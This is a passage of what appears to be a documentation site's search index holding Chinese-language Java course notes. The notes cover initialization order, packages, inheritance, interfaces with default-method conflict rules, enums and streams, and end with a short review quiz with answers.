\u5bf9\u8c61\u5c31\u662f\u6240\u6709\u666e\u901a\u5bf9\u8c61\u7684\u201c\u6a21\u677f\u201d\u548c\u201c\u5143\u6570\u636e\u5bb9\u5668\u201d</p> <p>\u603b\u7ed3\u4e0b\u6765\uff0c\u5bf9\u4e8e Java \u7c7b\u7684\u53d8\u91cf\u521d\u59cb\u5316\u987a\u5e8f\uff0c\u6211\u4eec\u5206\u4e3a\u7c7b\u52a0\u8f7d\u9636\u6bb5\u548c\u5bf9\u8c61\u521b\u5efa\u9636\u6bb5\uff1a</p> <ul> <li>&lt;1&gt; \u7c7b\u52a0\u8f7d\u9636\u6bb5<ul> <li>\u7b2c\u4e00\u6b21\u4f7f\u7528\u7c7b\uff08\u5305\u62ec new \u4e00\u4e2a\u5bf9\u8c61\u3001\u8c03\u7528\u9759\u6001\u65b9\u6cd5\u3001\u8bbf\u95ee\u9759\u6001\u5b57\u6bb5\u7b49\uff09\u65f6\uff0cJVM \u4f1a\u53bb\u52a0\u8f7d\u8fd9\u4e2a\u7c7b\u7684 <code>.class</code> \u6587\u4ef6</li> <li>\u6b64\u65f6\u7c7b\u4e2d\u7684\u9759\u6001\u4ee3\u7801\u5757\u88ab\u6267\u884c\uff0c\u9759\u6001\u53d8\u91cf\u88ab\u521d\u59cb\u5316</li> </ul> </li> <li>&lt;2&gt; \u5bf9\u8c61\u521b\u5efa\u9636\u6bb5<ul> <li>\u4f8b\u5982 new \u4e00\u4e2a\u5bf9\u8c61\u65f6\uff0c\u6b64\u65f6\u6211\u4eec\u5728\u5806\u4e2d\u4e3a\u5bf9\u8c61\u5206\u914d\u7a7a\u95f4</li> <li>\u9996\u5148\u6211\u4eec\u9ed8\u8ba4\u96f6\u503c\u586b\u5145\uff0c\u5c06\u6240\u6709\u57fa\u672c\u7c7b\u578b\u6210\u5458\u8bbe\u4e3a\u9ed8\u8ba4\u503c 0\uff0c\u5bf9\u8c61\u5f15\u7528\u8bbe\u4e3a <code>null</code></li> <li>\u7136\u540e\u624d\u6267\u884c\u5b57\u6bb5\u521d\u59cb\u5316\uff0c\u8fd9\u4e00\u6b65\u5728\u6784\u9020\u5668\u4e4b\u524d\u6267\u884c</li> <li>\u6700\u540e\u8c03\u7528\u6784\u9020\u51fd\u6570\uff0c\u5b8c\u6210\u5bf9\u8c61\u521d\u59cb\u5316\u903b\u8f91</li> </ul> </li> </ul>"},{"location":"Courses/Java/basic/#package","title":"Package","text":"<p>Package \u662f Java \u5bf9\u7a0b\u5e8f\u8fdb\u884c\u7ec4\u7ec7\u7684\u65b9\u5f0f\uff0c\u901a\u8fc7\u5173\u952e\u5b57 <code>import</code> \u5f15\u5165\u3002</p> PL syntax \u5b9e\u73b0 C/C++ <code>#include &lt;stdio.h&gt;</code> \u6587\u672c\u63d2\u5165\uff0c\u7f16\u8bd1\u65f6\u53ea\u770b\u539f\u578b\uff0c\u94fe\u63a5\u65f6\u9700\u8981\u7f16\u8bd1\u540e\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801 Java <code>import java.util.Scanner;</code> \u88c5\u8f7d\u7c7b\uff0c\u7528 RTTI \u4e86\u89e3\u7c7b\uff0c\u7f16\u8bd1\u548c\u8fd0\u884c\u65f6\u5747\u9700\u8981\u7f16\u8bd1\u540e\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\uff0c\u4f1a\u81ea\u52a8\u7f16\u8bd1 Python <code>import Pandas</code> \u88c5\u5728\u8fd0\u884c .py \u6587\u4ef6\uff0c\u9700\u8981\u6e90\u7801\u53ef\u89c1 <pre><code>import java.lang.Math;\ndouble r = Math.cos(Math.PI * theta);\n\n// \u901a\u8fc7 static import \u53ef\u4ee5\u5f15\u5165\u7c7b\u7684\u9759\u6001\u5bf9\u8c61\nimport static java.lang.Math.PI;\nimport static java.lang.Math.*;\ndouble r = cos(PI * theta);\n</code></pre> <p><code>package</code> \u53ef\u4ee5\u7531\u7528\u6237\u81ea\u5df1\u5b9a\u4e49\uff0c\u5177\u4f53\u8bed\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>// in MyClass.java\npackage mypackage;\npublic class MyClass {\n}\n\n// in other .java\nimport mypackage.*;\nMyClass m = new MyClass();\n</code></pre> <p>\u53e6\u5916\uff0c\u540c\u4e00\u4e2a package \u5185\u7684 class \u53ef\u4ee5\u8bbf\u95ee\u8be5\u5305\u4e2d\u5176\u5b83\u7c7b\u7684 <code>protected</code> \u6210\u5458\u3002</p> <p>\u4e8b\u5b9e\u4e0a\uff0cJava \u4e2d\u540c\u5305\u6bd4\u5b50\u7c7b\u66f4\u201c\u4eb2\u5bc6\u201d\u4e00\u4e9b</p>"},{"location":"Courses/Java/basic/#_2","title":"\u6cdb\u578b\u7f16\u7a0b","text":""},{"location":"Courses/Java/basic/#inheritance","title":"Inheritance","text":"<p>\u7ee7\u627f\u662f\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u91cd\u8981\u7684\u4e00\u4e2a\u7279\u6027\u3002\u5728\u6ca1\u6709\u663e\u5f0f\u7ee7\u627f\u65f6\uff0c\u6240\u6709\u7c7b\u90fd\u9ed8\u8ba4\u7ee7\u627f <code>java.lang.Object</code>\uff0c\u6240\u4ee5\u6240\u6709\u5bf9\u8c61\u90fd\u6709 <code>toString()</code>, <code>equals()</code>, <code>hashCode()</code> \u7b49\u65b9\u6cd5\u3002</p> <p>\u8fd9\u4e5f\u610f\u5473\u7740\u6240\u6709\u7c7b\u7684\u6839\u90fd\u662f <code>Object</code></p> <p>\u5728 Java \u4e2d\uff0c\u4e00\u4e2a\u7c7b\u53ea\u80fd\u7ee7\u627f\u4e00\u4e2a\u7236\u7c7b\uff08<code>extends</code>\uff09\uff0c\u56e0\u6b64\u4e0d\u5b58\u5728\u83f1\u5f62\u7ee7\u627f\u7684\u95ee\u9898\uff0c\u5176\u57fa\u672c\u8bed\u6cd5\u5199\u4f5c\uff1a</p> <pre><code>class ThisClass extends SuperClass {\n    // class body\n}\n</code></pre> <p>\u5bf9\u4e8e\u7ee7\u627f\u5173\u7cfb\u4e2d\u7684\u5bf9\u8c61\u6784\u9020\u987a\u5e8f\uff0c\u5176\u601d\u60f3\u57fa\u672c\u548c C++ \u76f8\u540c\uff0c\u5373\u5148\u6784\u9020\u7236\u7c7b\uff0c\u518d\u6784\u9020\u5b50\u7c7b\u3002\u6b64\u5904\u9700\u8981\u6ce8\u610f\u7684\u662f\u9759\u6001\u6210\u5458\u53d8\u91cf\u548c\u9759\u6001\u4ee3\u7801\u5757\uff0c\u5b83\u4eec\u53ea\u4f1a\u5728\u7c7b\u52a0\u8f7d\u9636\u6bb5\u6267\u884c\u4e00\u6b21\uff0c\u8981\u5c06\u5b83\u4eec\u4e0e\u5bf9\u8c61\u521b\u5efa\u9636\u6bb5\u5206\u5f00\u770b\u5f85\uff1a</p> <pre><code>class Parent {\n    // \u9759\u6001\u6210\u5458\n    static int staticVarP = initStaticVarP();\n\n    // \u9759\u6001\u4ee3\u7801\u5757\n    static {\n        System.out.println(\"Parent \u9759\u6001\u4ee3\u7801\u5757\");\n    }\n\n    // \u975e\u9759\u6001\u6210\u5458\n    int instanceVarP = initInstanceVarP();\n\n    // \u975e\u9759\u6001\u4ee3\u7801\u5757\n    {\n        System.out.println(\"Parent \u975e\u9759\u6001\u4ee3\u7801\u5757\");\n    }\n\n    // \u6784\u9020\u51fd\u6570\n    Parent() {\n        System.out.println(\"Parent \u6784\u9020\u51fd\u6570\");\n    }\n\n    // \u5de5\u5177\u65b9\u6cd5\n    static int initStaticVarP() {\n        System.out.println(\"Parent \u9759\u6001\u6210\u5458\u521d\u59cb\u5316\");\n        return 1;\n    }\n    int initInstanceVarP() {\n        System.out.println(\"Parent \u975e\u9759\u6001\u6210\u5458\u521d\u59cb\u5316\");\n        return 2;\n    }\n}\n\nclass Child extends Parent {\n    static int staticVarC = initStaticVarC();\n\n    static {\n        System.out.println(\"Child \u9759\u6001\u4ee3\u7801\u5757\");\n    }\n\n    int instanceVarC = initInstanceVarC();\n\n    {\n        System.out.println(\"Child \u975e\u9759\u6001\u4ee3\u7801\u5757\");\n    }\n\n    Child() {\n        System.out.println(\"Child \u6784\u9020\u51fd\u6570\");\n    }\n\n    static int initStaticVarC() {\n        System.out.println(\"Child \u9759\u6001\u6210\u5458\u521d\u59cb\u5316\");\n        return 3;\n    }\n    int initInstanceVarC() {\n        System.out.println(\"Child \u975e\u9759\u6001\u6210\u5458\u521d\u59cb\u5316\");\n        return 4;\n    }\n}\n\npublic class Demo {\n    public static void main(String[] args) {\n        System.out.println(\"=== \u521b\u5efa\u5b50\u7c7b\u5bf9\u8c61 ===\");\n        new Child();\n    }\n}\n</code></pre> <p>\u4e0a\u8ff0\u6d4b\u8bd5\u7684\u8f93\u51fa\u7ed3\u679c\u4e3a\uff1a</p> <pre><code>=== \u521b\u5efa\u5b50\u7c7b\u5bf9\u8c61 ===\nParent \u9759\u6001\u6210\u5458\u521d\u59cb\u5316\nParent \u9759\u6001\u4ee3\u7801\u5757\nChild \u9759\u6001\u6210\u5458\u521d\u59cb\u5316\nChild \u9759\u6001\u4ee3\u7801\u5757\nParent \u975e\u9759\u6001\u6210\u5458\u521d\u59cb\u5316\nParent \u975e\u9759\u6001\u4ee3\u7801\u5757\nParent \u6784\u9020\u51fd\u6570\nChild \u975e\u9759\u6001\u6210\u5458\u521d\u59cb\u5316\nChild \u975e\u9759\u6001\u4ee3\u7801\u5757\nChild \u6784\u9020\u51fd\u6570\n</code></pre> <p>\u5728\u7ee7\u627f\u4e2d\uff0c\u5982\u679c\u7236\u7c7b\u6ca1\u6709\u65e0\u53c2\u6784\u9020\u51fd\u6570\uff0c\u6216\u8005\u8bf4\u5982\u679c\u5b50\u7c7b\u60f3\u8981\u8c03\u7528\u7236\u7c7b\u7684\u6709\u53c2\u6784\u9020\u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u5b50\u7c7b\u4e2d\u4f7f\u7528 <code>super(...)</code> \u663e\u5f0f\u8c03\u7528\u5e76\u4f20\u53c2\u3002</p> <pre><code>class Parent {\n    Parent(int x) {\n        System.out.println(\"Parent \u6784\u9020\u51fd\u6570, x = \" + x);\n    }\n}\n\nclass Child extends Parent {\n    Child(int y) {\n        super(y); // \u5fc5\u987b\u663e\u5f0f\u8c03\u7528\u7236\u7c7b\u7684\u6709\u53c2\u6784\u9020\n        System.out.println(\"Child \u6784\u9020\u51fd\u6570, y = \" + y);\n    }\n}\n</code></pre> <ul> <li>\u5982\u679c\u7236\u7c7b\u6709\u65e0\u53c2\u6784\u9020\u51fd\u6570\uff0c\u5b50\u7c7b\u6ca1\u5199 <code>super()</code>\uff0c\u5219\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u52a0\u4e00\u4e2a <code>super()</code></li> <li>\u5982\u679c\u7236\u7c7b\u53ea\u6709\u6709\u53c2\u6784\u9020\u51fd\u6570\uff0c\u5b50\u7c7b\u5fc5\u987b\u663e\u5f0f\u4e66\u5199 <code>super(...)</code>\uff0c\u5426\u5219\u7f16\u8bd1\u62a5\u9519</li> </ul> <p><code>super(...)</code> \u5fc5\u987b\u662f\u5b50\u7c7b\u6784\u9020\u51fd\u6570\u7684\u7b2c\u4e00\u884c</p> <p>Java \u4e2d\u7684 Name Hiding\u3001Overload \u7b49\u548c C++ \u4e2d\u5747\u76f8\u540c\uff0c\u4f46\u662f Override \u5b58\u5728\u5dee\u5f02\u3002\u5bf9\u4e8e Java\uff0c\u4f60\u53ef\u4ee5\u770b\u4f5c\u6240\u6709\u975e <code>static</code>, \u975e <code>private</code>, \u975e <code>final</code> \u7684\u65b9\u6cd5\u90fd\u662f\u865a\u51fd\u6570\uff0c\u5982\u679c\u5b50\u7c7b\u5b9a\u4e49\u540c\u7b7e\u540d\u65b9\u6cd5\uff0c\u5219\u9ed8\u8ba4\u5c31\u4e3a\u91cd\u5199(override)\u3002</p> <p>Java 5 \u4e4b\u540e\u5f15\u5165\u4e86 <code>@Override</code> \u6ce8\u89e3\uff0c\u8ba9\u7f16\u8bd1\u5668\u8fdb\u884c\u68c0\u67e5</p> <p>\u4ec5\u6709\u8fd4\u56de\u503c\u7c7b\u578b\u4e0d\u540c\u4e0d\u4f1a\u88ab\u8ba4\u4e3a\u662f Overload\uff0c\u5e76\u4e14\u4f1a\u5bfc\u81f4\u7f16\u8bd1\u9519\u8bef\uff01\uff01\uff01</p> <p>\u5f53\u6211\u4eec\u8c03\u7528\u7c7b\u7684\u65b9\u6cd5 <code>someClass.someMethod()</code> \u65f6\uff0c\u7f16\u8bd1\u5668/\u8fd0\u884c\u65f6\u9700\u8981\u51b3\u5b9a\u5e94\u8be5\u8c03\u7528\u54ea\u4e00\u4e2a\u5177\u4f53\u7684\u51fd\u6570\u9898\uff0c\u5373 Method Call Binding\u3002</p> <ul> <li>Static Binding: \u5728\u7f16\u8bd1\u671f\u5c31\u51b3\u5b9a\u597d\uff0c\u5e38\u7528\u4e8e <code>static</code>, <code>final</code>, <code>private</code> \u65b9\u6cd5</li> </ul> <pre><code>class Test {\n    static void hello() { System.out.println(\"Hello\"); }\n    public static void main(String[] args) {\n        Test.hello(); // \u9759\u6001\u7ed1\u5b9a\uff0c\u7f16\u8bd1\u65f6\u5c31\u77e5\u9053\u8c03\u54ea\u4e2a\u65b9\u6cd5\n    }\n}\n</code></pre> <ul> <li>Dynamic Binding: \u8fd0\u884c\u65f6\u624d\u51b3\u5b9a\uff0c\u8c03\u7528\u7684\u65b9\u6cd5\u53d6\u51b3\u4e8e\u5bf9\u8c61\u7684\u5b9e\u9645\u7c7b\u578b\uff0c\u800c\u4e0d\u662f\u5f15\u7528\u7c7b\u578b</li> </ul> <pre><code>class Animal {\n    void speak() { System.out.println(\"Animal speaks\"); }\n}\nclass Dog extends Animal {\n    @Override\n    void speak() { System.out.println(\"Dog barks\"); }\n}\npublic class Test {\n    public static void main(String[] args) {\n        Animal a = new Dog(); \n        a.speak(); // \u52a8\u6001\u7ed1\u5b9a -&gt; \u8c03\u7528 Dog \u7684\u65b9\u6cd5\n    }\n}\n</code></pre> <p>\u52a8\u6001\u7ed1\u5b9a\u662f Java \u5b9e\u73b0\u591a\u6001 Polymorphism \u7684\u5173\u952e</p> <p>\u4e00\u4e2a\u53ea\u6709\u58f0\u660e\uff0c\u6ca1\u6709\u65b9\u6cd5\u4f53\u7684\u65b9\u6cd5\u88ab\u79f0\u4e3a\u62bd\u8c61\u65b9\u6cd5\uff08abstract method\uff09\uff0c\u5b83\u7684\u4f5c\u7528\u662f\u5b9a\u4e49\u4e00\u4e2a\u7edf\u4e00\u7684\u63a5\u53e3\u89c4\u8303\uff0c\u8ba9\u5b50\u7c7b\u53bb\u5b9e\u73b0\u5177\u4f53\u7684\u529f\u80fd\uff1a</p> <pre><code>abstract class Animal {\n    abstract void speak(); // \u62bd\u8c61\u65b9\u6cd5\uff0c\u6ca1\u6709\u65b9\u6cd5\u4f53\n}\n</code></pre> <p>\u542b\u6709\u62bd\u8c61\u65b9\u6cd5\u7684\u7c7b\u5fc5\u987b\u58f0\u660e\u4e3a <code>abstract</code>\uff0c\u5e76\u4e14\u4e0d\u80fd\u4f7f\u7528 <code>new</code> \u6765\u6784\u9020\u5b83\u3002\u4f46\u662f\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u5b9a\u4e49\u6784\u9020\u65b9\u6cd5\u3001\u666e\u901a\u65b9\u6cd5\uff0c\u751a\u81f3\u9759\u6001\u65b9\u6cd5\u3002</p> <p>\u5b50\u7c7b\u7ee7\u627f\u62bd\u8c61\u7c7b\u540e\uff0c\u8981\u4e48\u5b9e\u73b0\u6240\u6709\u62bd\u8c61\u65b9\u6cd5\uff0c\u8981\u4e48\u628a\u81ea\u5df1\u4e5f\u5b9a\u4e49\u4e3a\u62bd\u8c61\u7c7b\u3002</p> <p>totally abstract class \u88ab\u79f0\u4e3a Interface\uff0c\u5b83\u7684\u6240\u6709\u65b9\u6cd5\u90fd\u9ed8\u8ba4\u662f <code>public abstract</code> \u7684\uff0c\u6240\u6709\u6210\u5458\u53d8\u91cf\u90fd\u9ed8\u8ba4\u662f <code>public static final</code> \u7684\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u8bf4\u63a5\u53e3\u662f\u7531\u5168\u5c40\u5e38\u91cf\u548c\u516c\u5171\u62bd\u8c61\u65b9\u6cd5\u7ec4\u6210\u7684\u7279\u6b8a\u7c7b\uff1a</p> <pre><code>// \u5b9a\u4e49\u63a5\u53e3\ninterface Animal {\n    void speak();  // \u9ed8\u8ba4\u5c31\u662f public abstract\n    int AGE = 3;   // \u9ed8\u8ba4\u5c31\u662f public static final\n\n    // default \u65b9\u6cd5\uff1a\u5e26\u9ed8\u8ba4\u5b9e\u73b0\uff0c\u5b9e\u73b0\u7c7b\u53ef\u590d\u7528\u4e5f\u53ef\u8986\u76d6\n    default void sayHi(String name) {\n        System.out.println(\"Hi, \" + name + \" (from default method)\");\n    }\n}\n\n// \u5b9e\u73b0\u63a5\u53e3\u7684\u7c7b\nclass Dog implements Animal {\n    @Override\n    public void speak() {\n        System.out.println(\"Dog barks\");\n    }\n}\n</code></pre> <p>\u6ce8\u610f\u8981\u4f7f\u7528 <code>implements</code> \u800c\u4e0d\u662f <code>extends</code>\uff0c\u4f46\u662f\u4e00\u4e2a\u7c7b\u53ef\u4ee5\u540c\u65f6 <code>implements</code> \u548c <code>extends</code></p> <p>\u540c\u65f6\uff0c\u56e0\u4e3a\u63a5\u53e3\u4e0d\u80fd\u88ab\u5b9e\u4f8b\u5316\uff0c\u6211\u4eec\u4e5f\u4e0d\u80fd\u4e3a Interface \u5b9a\u4e49\u6784\u9020\u65b9\u6cd5\u3002</p> <p>\u63a5\u53e3\u672c\u8eab\u4e5f\u53ef\u4ee5\u7ee7\u627f\u4e00\u4e2a\u6216\u591a\u4e2a\u63a5\u53e3\uff0c\u4f46\u662f\u4e0d\u80fd\u7ee7\u627f\u7c7b\uff08\u4e5f\u5305\u62ec\u62bd\u8c61\u7c7b\uff09\uff1a</p> <pre><code>// \u5b9a\u4e49\u4e00\u4e2a\u57fa\u7840\u63a5\u53e3\ninterface Animal {\n    void eat();\n}\n\n// \u8ba9\u53e6\u4e00\u4e2a\u63a5\u53e3\u7ee7\u627f\u5b83\ninterface Pet extends Animal {\n    void play();\n}\n\n// \u5b9e\u73b0\u5b50\u63a5\u53e3\u7684\u7c7b\nclass Dog implements Pet {\n    public void eat() {\n        System.out.println(\"Dog is eating.\");\n    }\n\n    public void play() {\n        System.out.println(\"Dog is playing.\");\n    }\n\n    public static void main(String[] args) {\n        Dog d = new Dog();\n        d.eat();   // \u8c03\u7528\u4ece Animal \u63a5\u53e3\u7ee7\u627f\u7684\u65b9\u6cd5\n        d.play();  // \u8c03\u7528\u5728 Pet \u63a5\u53e3\u4e2d\u65b0\u5b9a\u4e49\u7684\u65b9\u6cd5\n    }\n}\n</code></pre> <p>\u56e0\u6b64\u5982\u679c\u6211\u4eec\u9047\u5230 <code>extends sth1, sth2</code> \u7684\u60c5\u51b5\uff0c\u4e00\u5b9a\u662f\u63a5\u53e3\u5728\u591a\u7ee7\u627f\u63a5\u53e3</p> <p>Example</p> Common SituationDeeper Situation <p></p> <p></p> <p>\u524d\u9762\u8bf4\u8fc7\u4e00\u4e2a\u7c7b\u53ea\u80fd\u7ee7\u627f\u4e00\u4e2a\u7236\u7c7b\uff0c\u4f46\u662f\u4e00\u4e2a\u7c7b\u53ef\u4ee5\u5b9e\u73b0\u591a\u4e2a\u63a5\u53e3\u3002</p> <p>\u5982\u679c\u4e00\u4e2a\u7c7b\u5b9e\u73b0\u4e86\u4e24\u4e2a\u63a5\u53e3\uff0c\u5e76\u4e14\u8fd9\u4e24\u4e2a\u63a5\u53e3\u4e2d\u5b58\u5728\u76f8\u540c\u524d\u9762\u7684\u9ed8\u8ba4\u65b9\u6cd5\uff0c\u90a3\u4e48\u7f16\u8bd1\u5668\u5c31\u4e0d\u77e5\u9053\u6539\u7528\u54ea\u4e2a\u5b9e\u73b0\uff0c\u51fa\u73b0\u51b2\u7a81\u3002\u56e0\u6b64\u6211\u4eec\u9700\u8981\u624b\u52a8\u663e\u5f0f\u6307\u5b9a\u4f7f\u7528\u54ea\u4e2a\u63a5\u53e3\u7684\u5b9e\u73b0\uff0c\u4f8b\u5982\uff1a</p> <pre><code>public interface Jukebox {\n    public default String rock() {\n        return \"... all over the world!\";\n    }\n}\npublic interface Carriage {\n    public default String rock() {\n        return \"... from side to side\";\n    }\n}\npublic class MusicalCarriage implements Carriage, Jukebox {\n    @Override\n    public String rock() {\n        // \u76f4\u63a5\u91cd\u5199\u4e5f\u53ef\u4ee5\n        return Carriage.super.rock();\n    }\n}\n</code></pre> <p>\u5f53\u7c7b\u548c\u63a5\u53e3\u7684\u9ed8\u8ba4\u65b9\u6cd5\u53d1\u751f\u51b2\u7a81\u65f6\uff0cJava \u7684\u4e09\u6761\u89e3\u6790\u89c4\u5219\uff1a</p> <ul> <li>&lt;1&gt; \u7236\u7c7b\u7684\u5b9e\u73b0\u4f18\u5148 Any class wins over any interface<ul> <li>\u5f53\u4e00\u4e2a\u7c7b\u540c\u65f6 <code>extends</code> \u4e00\u4e2a\u7236\u7c7b\u548c <code>implements</code> \u4e00\u4e2a\u63a5\u53e3\uff0c\u5982\u679c\u7236\u7c7b\u4e2d\u5df2\u7ecf\u6709\u5177\u4f53\u5b9e\u73b0\uff0c\u54ea\u6015\u63a5\u53e3\u4e2d\u6709\u9ed8\u8ba4\u65b9\u6cd5\u4e5f\u4f1a\u76f4\u63a5\u4f7f\u7528\u7236\u7c7b\u4e2d\u7684\u5b9e\u73b0</li> <li>\u5373\u7ee7\u627f\u7684\u4f18\u5148\u7ea7\u9ad8\u4e8e\u63a5\u53e3</li> </ul> </li> <li>&lt;2&gt; \u5b50\u63a5\u53e3\u4f18\u5148 Subtype wins over super-type<ul> <li>\u5982\u679c\u4e24\u4e2a\u63a5\u53e3\u90fd\u63d0\u4f9b\u4e86\u540c\u540d\u9ed8\u8ba4\u65b9\u6cd5\uff0c\u5e76\u4e14\u4e00\u4e2a\u63a5\u53e3\u7ee7\u627f\u4e86\u53e6\u4e00\u4e2a\u63a5\u53e3\uff0c\u90a3\u4e48\u5b50\u63a5\u53e3\u7684\u5b9e\u73b0\u4f1a\u8986\u76d6\u7236\u63a5\u53e3\u7684\u5b9e\u73b0</li> </ul> </li> <li>&lt;3&gt; \u5fc5\u987b\u89e3\u51b3\u51b2\u7a81 No rule 3<ul> <li>\u5982\u679c\u524d\u4e24\u6761\u89c4\u5219\u4e0d\u80fd\u89e3\u51b3\u51b2\u7a81\uff0c\u7f16\u8bd1\u5668\u4f1a\u62a5\u9519\uff0c\u6b64\u65f6\u5728\u5b50\u7c7b\u4e2d\u5fc5\u987b\u624b\u52a8\u91cd\u5199\u65b9\u6cd5\u6216\u663e\u5f0f\u6307\u5b9a\u8c03\u7528\u54ea\u4e2a\u63a5\u53e3\u7684\u9ed8\u8ba4\u5b9e\u73b0</li> </ul> </li> </ul> <p>Staic Methods in Interface</p> <p>\u63a5\u53e3\u4e2d\u7684\u9759\u6001\u65b9\u6cd5\u5c5e\u4e8e\u63a5\u53e3\u672c\u8eab\uff0c\u4e0d\u80fd\u88ab\u5b9e\u73b0\u7c7b\u7ee7\u627f\uff0c\u4e5f\u4e0d\u80fd\u88ab\u5b9e\u73b0\u7c7b\u8986\u76d6\uff0c\u53ea\u80fd\u901a\u8fc7\u63a5\u53e3\u540d\u8c03\u7528\u3002</p>"},{"location":"Courses/Java/basic/#enum","title":"ENUM","text":"<p>\u679a\u4e3e <code>enum</code> \u5176\u5b9e\u4e5f\u662f\u4e00\u79cd\u7c7b\uff0c\u4e5f\u53ef\u4ee5\u6709\u6210\u5458\u53d8\u91cf\u3001\u6210\u5458\u51fd\u6570\u4ee5\u53ca\u6784\u9020\u51fd\u6570\u7b49\uff0c\u4f46\u662f\u4e0d\u80fd\u5b9a\u4e49\u5728\u65b9\u6cd5\u5185\u3002</p> <p>Java \u652f\u6301\u53ef\u53d8\u53c2\u6570\uff0c\u4f8b\u5982</p> <pre><code>func(String... a) // \u7b49\u4ef7\u4e8e (String[] a)\uff0c\u53ea\u662f\u8c03\u7528\u7684\u65f6\u5019\u4e0d\u7528\u521b\u5efa\u4e00\u4e2a\u6570\u7ec4\u4e86\n{\n    // ...\n}\n</code></pre>"},{"location":"Courses/Java/basic/#container","title":"Container","text":""},{"location":"Courses/Java/basic/#stream","title":"Stream","text":"<p>\u6d41\u5f0f\u8ba1\u7b97\u7528\u4e8e\u89e3\u51b3\u5bb9\u5668\u7684\u904d\u5386\u64cd\u4f5c\uff0c\u5c1d\u8bd5\u5c06\u8ba1\u7b97\u9001\u8fdb\u5bb9\u5668\u4e2d\uff0c\u800c\u4e0d\u662f\u5c06\u5bb9\u5668\u5185\u6570\u636e\u62ff\u51fa\u6765\u505a\u8ba1\u7b97\uff0c\u4ece\u800c\u63d0\u9ad8\u6548\u7387\u3002</p> <p>\u6b63\u5e38\u4f7f\u7528 for each \u7684\u65b9\u5f0f\uff1a</p> <pre><code>Arraylist&lt;Artist&gt; artists = new Arraylist&lt;&gt;();\n\nint cnt = 0;\nfor (Artist artist : artists)\n    if (artist.isFrom(\"London\"))\n        cnt ++;\nSystem.out.println(cnt);\n</code></pre> <p>\u4f7f\u7528 stream \u65b9\u5f0f\uff1a</p> <pre><code>long count = artists.stream()\n             .filter(artist -&gt; artist.isFrom(\"London\")) // Lambda\n             .count();\nSystem.out.println(count);\n</code></pre> <p><code>filter</code> \u5e76\u4e0d\u662f\u5355\u7eaf\u7684\u904d\u5386\u8fc7\u6ee4\uff0c\u800c\u662f\u6784\u5efa\u6d41\u6c34\u7ebf\uff0c</p> <p>\u4e00\u4e2a\u6d41\u8ba1\u7b97\u53ef\u4ee5\u6709\u591a\u4e2a\u4e2d\u95f4\u64cd\u4f5c\uff0c\u4f46\u662f\u53ea\u80fd\u6709\u4e00\u4e2a\u7ec8\u7aef\u64cd\u4f5c\u3002</p> <p><code>java.util.stream</code> \u4e2d\u63d0\u4f9b\u4e86\u56db\u5957\u4e13\u95e8\u7528\u4e8e\u57fa\u672c\u7c7b\u578b\u7684\u6d41\u7c7b\u578b\uff0c\u5b83\u4eec\u90fd\u5b9e\u73b0 <code>BaseStream</code> \u63a5\u53e3\uff0c</p> <p>TODO\uff1a\u76f4\u63a5\u4e66\u5199\u4e00\u4e2a create stream \u7684\u8868\u683c</p> <p>\u77ed\u8def eager\uff0c\u4e0d\u8dd1\u5b8c\u6240\u6709\u5143\u7d20</p>"},{"location":"Courses/Java/basic/#io","title":"IO","text":"<p>nio \u548c nio2.0 \u4e0d\u8003</p>"},{"location":"Courses/Java/concurrent/","title":"Concurrent","text":"<p> \u7ea6 0 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"Courses/Java/review/","title":"Review","text":"<p> \u7ea6 246 \u4e2a\u5b57  2 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <ul> <li>Which one below is NOT a valid Java identifier?<ul> <li>A. Each</li> <li>B. goto</li> <li>C. \u540d\u5b57</li> <li>D. $2</li> <li>\u6807\u8bc6\u7b26\u53ef\u4ee5\u5305\u62ec unicode\u5b57\u7b26\uff08\u5305\u62ec\u4e2d\u6587\uff09\uff0c\u6570\u5b57\uff08\u4e0d\u80fd\u5728\u5f00\u5934\uff09\uff0c\u4e0b\u5212\u7ebf\u4ee5\u53ca\u7f8e\u5143\u7b26\u53f7\u3002</li> </ul> </li> <li>About access control in Java, which statement below is correct?<ul> <li>A. A member without any access modifier is default to <code>private</code></li> <li>B. A member without any access modifier is default to <code>public</code></li> <li>C. A member without any access modifier is default to <code>private</code></li> <li>D. Classes in the same package can access members without any access modifier.</li> <li>\u6ca1\u52a0\u4efb\u4f55\u8bbf\u95ee\u63a7\u5236\u4fee\u9970\u7b26\uff0c\u5219\u53ea\u6709\u540c\u4e00\u4e2a\u5305\u5185\u7684\u7c7b\u53ef\u4ee5\u8bbf\u95ee\uff0c\u4e0d\u5728\u540c\u4e00\u4e2a\u5305\u7684\u5b50\u7c7b\u4e0d\u80fd\u8bbf\u95ee</li> </ul> </li> <li>[F] There is a <code>length()</code> method for all the arrays to represent the number of elements<ul> <li><code>String</code> \u4f7f\u7528 <code>length()</code> \u65b9\u6cd5\uff0c\u6570\u7ec4\u4f7f\u7528 <code>length</code> \u5c5e\u6027</li> </ul> </li> </ul> <pre><code>class B {}\nclass C extends B {}\n</code></pre> \u9009\u9879 \u80fd\u5426\u63a5\u53d7 List\\&lt;B&gt; \u80fd\u5426\u63a5\u53d7 List\\&lt;C&gt; \u8bf4\u660e A. <code>List&lt;? extends B&gt;</code> \u2705 \u2705 \u4e0a\u754c\u901a\u914d\u7b26\uff0cC \u662f B \u7684\u5b50\u7c7b B. <code>List&lt;B&gt;</code> \u2705 \u274c \u6cdb\u578b\u4e0d\u534f\u53d8\uff0c\u867d\u7136 C \u662f B \u7684\u5b50\u7c7b\uff0c\u4f46\u662f List\\&lt;C&gt; \u4e0d\u662f List\\&lt;B&gt; \u7684\u5b50\u7c7b C. <code>List</code> \u2705 \u2705 \u539f\u751f\u7c7b\u578b\uff0c\u64e6\u9664\u6cdb\u578b\u540e\u90fd\u80fd\u63a5\u6536 D. <code>List&lt;?&gt;</code> \u2705 \u2705 \u4efb\u610f\u7c7b\u578b\u901a\u914d\u7b26"},{"location":"Courses/Java/web/","title":"Web","text":"<p> \u7ea6 0 \u4e2a\u5b57  